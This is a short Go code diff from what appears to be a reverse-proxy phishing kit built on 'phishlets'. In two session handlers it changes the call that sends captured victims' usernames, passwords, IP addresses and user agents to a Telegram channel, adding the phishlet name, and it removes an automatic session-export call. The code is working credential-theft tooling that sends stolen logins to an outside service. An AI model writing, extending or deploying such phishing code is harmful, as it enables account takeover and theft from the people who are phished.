@@ -2063,10 +2063,7 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 				if pl, err := p.cfg.GetPhishlet(s.Name); err == nil && pl != nil {
 					domain = pl.GetLandingPhishHost()
 				}
-				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain)
-				
-				// Auto-export and send session with any captured data
-				p.AutoExportAndSendSession(sessionID, sid)
+				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain, s.Name)
 			}
 		}
 	}
@@ -2087,10 +2084,7 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				if pl, err := p.cfg.GetPhishlet(s.Name); err == nil && pl != nil {
 					domain = pl.GetLandingPhishHost()
 				}
-				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain)
-				
-				// Auto-export and send session with any captured data
-				p.AutoExportAndSendSession(sessionID, sid)
+				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain, s.Name)
 			}
 		}
 	}
